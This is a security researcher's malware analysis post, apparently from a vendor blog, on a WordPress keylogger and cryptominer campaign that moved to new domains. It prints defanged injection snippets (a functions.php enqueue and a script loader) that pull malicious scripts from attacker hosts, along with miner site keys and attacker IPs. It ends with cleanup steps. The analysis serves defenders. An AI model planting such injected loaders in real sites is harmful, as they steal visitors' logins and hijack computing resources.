@@ -1,0 +1,66 @@
+Cloudflare[.]solutions Keylogger Returns on New Domains
+
+A few months ago, we covered two injections related to the “cloudflare.solutions” malware: a CoinHive cryptominer hidden within fake Google Analytics and jQuery, and the WordPress keylogger from Cloudflare[.]solutions. This malware was originally identified by one of our analysts in April 2017 and has since evolved and spread to new domains.
+Keylogger Spreads to New Domains
+A few days after our keylogger post was released on Dec 8th, 2017, the Cloudflare[.]solutions domain was taken down. This was not the end of the malware campaign, however; attackers immediately registered a number of new domains including cdjs[.]online on Dec 8th, cdns[.]ws on Dec 9th, and msdns[.]online on Dec 16th.
+PublicWWW has already identified relatively few infected sites: 129 websites for cdns[.]ws and 103 websites for cdjs[.]online, but it’s likely that the majority of the websites have not been indexed yet. Since mid-December, msdns[.]online has infected over a thousand websites, though the majority are reinfections from sites that have already been compromised.
+Injected Scripts Used in the Attack
+There are a variety of injected scripts that have been used in this attack in the past month:
+
+hxxps://cdjs[.]online/lib.js
+hxxps://cdjs[.]online/lib.js?ver=…
+hxxps://cdns[.]ws/lib/googleanalytics.js?ver=…
+hxxps://msdns[.]online/lib/mnngldr.js?ver=…
+hxxps://msdns[.]online/lib/klldr.js
+
+The cdjs[.]online script is injected into either a WordPress database (wp_posts table) or into the theme’s functions.php file, just like we saw in the former cloudflare[.]solutions attack.
+The cdns[.]ws and msdns[.]online scripts can also be found injected into the theme’s functions.php file:
+function chmnr_klgr_enqueue_script() {
+wp_enqueue_script( 'chmnr_klgr-js', 'hxxps://cdns[.]ws/lib/googleanalytics.js', false );
+Unlike the previous version that contained the “add_js_scripts” hook function to enqueue the script, this attack uses functions and hook names that suggest what their purpose is. For example, chmnr_klgr-js most likely translates to “miner_keylogger“.
+The Evolution of the Fake GoogleAnalytics Script
+Just like previous versions of the campaign, we identified a fake googleanalytics.js that loads an obfuscated script.
+It decodes to the following code, revealing a function labeled startGoogleAnalytics:
+Decoded googleanalytics.js script
+This startGoogleAnalytics script loads three other scripts from cdns[.]ws:
+
+hxxps://cdns[.]ws/lib/jquery-3.2.1.min.js?v=1.013
+hxxps://cdns[.]ws/lib/kl.js
+hxxps://cdns[.]ws/lib/mnrstrtr.js
+
+Side note: In the case of libs.js from cdjs[.]online, an almost identical script is loaded, however, it does not include any obfuscation.
+Cryptominer in Fake jQuery
+We’ve identified that the library jquery-3.2.1.min.js is similar to the encrypted CoinHive cryptomining library from the previous version, loaded from hxxp:// 3117488091/lib/jquery-3.2.1.min.js?v=3.2.11 (or hxxp://185 .209 .23 .219/lib/jquery-3.2.1.min.js?v=3.2.11, a more familiar representation of the IP address). This is not surprising since cdjs[.]online also exists on the server 185 .209 .23 .219.
+It’s interesting to note that this script extends the CoinHive library and adds an alternative configuration using the 185 .209 .23 .219 server (and now specifically cdjs[.]online) for LIB_URL and WEBSOCKET_SHARDS.
+Two miner configurations
+In this new setup, the CoinHive configuration is used by default, however; if the connection to CoinHive server fails, the attackers use the cdjs[.]online configuration with the sitekey lZnIoM7JAc6g0xBbWpUsVKSuLPBehT4s as a fallback.
+To initialize the miner, the malware uses mnrstrtr.js (which should be translated as “miner starter”) loaded from the malicious startGoogleAnalytics function:
+var gstats = new googleanalytics.Anonymous('NPRak9QU4lFBSneFt23qEIChh5r0SZev');
+This script creates an instance of the CoinHive miner with the NPRak9QU4lFBSneFt23qEIChh5r0SZev site key, which is the same key that was also seen in the older versions of the malware.
+The Keylogger
+The /lib/kl.js script is the familiar keylogger (thus the kl.js name) that we saw last year in the cloudflare[.]solutions malware.
+In the screenshot below, you can see that the decoded Javascript files are fairly similar to the previous campaign:
+Comparing the difference between the new and old keylogger
+The only changes are the socketURL address, which now decodes to “wss://cdjs[.]online:8085/” (instead of wss://cloudflare[.]solutions:8085) and the red herring part of the linterkeys variables changed from “https://cdnjs.cloudflare.com/ajax/libs/linter/linter.js” to a more neutral “https://js.io/query”.
+Unfortunately for unsuspecting users and owners of the infected websites, the keylogger behaves the same way as in previous campaigns. The script sends data entered on every website form (including the login form) to the hackers via the WebSocket protocol. You can read about how the keylogger works in our previous article.
+Msdns[.]online Injections
+I’d like to highlight the new malicious domain msdns[.]online, which is slightly different in its behavior. Unlike the scripts from other two domains, it serves either a cryptominer (hxxps://msdns[.]online/lib/mnngldr.js?ver=… which still pretends to be Google Analytics and jQuery) or a keylogger (hxxps://msdns[.]online/lib/klldr.js).
+The keylogger loads this code:
+var snf = document.createElement("script");
+snf.type = "text/javascript";
+snf.setAttribute("defer", "defer");
+snf.src = "hxxps://msdns[.]online/lib/kl.js";
+document.head.appendChild(snf);
+
+This code then loads the hxxps://msdns[.]online/lib/kl.js script. Since msdns[.]online is located on the same server as cdns[.]ws, this kl.js is the same WordPress keylogger we described in the previous section – this helps us to translate the klldr.js filename as “keylogger loader”.
+Three Malicious IPs
+We have identified that this new attack is utilizing the following 3 servers:
+
+185.209.23.219 (cdjs[.]online, or 3117488091, where you can still find the cloudflare[.]solutions version of the keylogger)
+185.14.28.10 (or 3104709642, which still hosts the hxxp://185.14.28 .10/lib/jquery-3.2.1.min.js?v=3.2.11 cryptominer and the cloudflare[.]solutions version of the keylogger hxxp://185 .14 .28. 10/lib/kl.js)
+107.181.161.159 (cdns[.]ws and msdns[.]online – which serves new versions of the cryptominers and keyloggers)
+
+Conclusion
+While these new attacks do not yet appear to be as massive as the original Cloudflare[.]solutions campaign, the reinfection rate shows that there are still many sites that have failed to properly protect themselves after the original infection. It’s possible that some of these websites didn’t even notice the original infection.
+To clean up a website that has been compromised with this infection, you’ll need to remove the malicious code from theme’s functions.php, scan wp_posts table for possible injections, change all WordPress passwords(!) and update all server software including third-party themes and plugins.
+You can find a more detailed guide on how to clean a WordPress site here. As an extra protection, we recommend that you consider using a website firewall.
